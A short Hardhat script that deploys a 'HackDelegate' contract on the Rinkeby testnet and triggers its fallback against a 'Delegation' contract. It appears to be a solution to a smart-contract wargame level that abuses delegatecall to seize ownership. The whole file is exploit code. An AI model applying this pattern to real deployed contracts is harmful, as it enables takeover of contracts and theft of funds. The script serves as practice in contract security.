require("dotenv").config();

const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_URL );
const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );

const main = async () => {
  const delegateAbi = await hre.artifacts.readArtifact("contracts/Delegate\.sol:Delegation");
  const delegateContract = await new hre.ethers.Contract("0xF529B82545A17D9fa5af95a17F391aef6e95c93E", delegateAbi.abi, wallet);
  console.log("Delegate contract: " + delegateContract.address);

  const hackDelegateFactory = await hre.ethers.getContractFactory("HackDelegate"),
  hackDelegate = await hackDelegateFactory.deploy("0x023e90580fCda1c544C7D710c34fb9630041fEd9");
  await hackDelegate.deployed();
  console.log("Contract deployed to: " + hackDelegate.address);

  let txn = await hackDelegate.callFallback("0xF529B82545A17D9fa5af95a17F391aef6e95c93E")
  await txn.wait();
  console.log("Fallback function successfully called.");
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
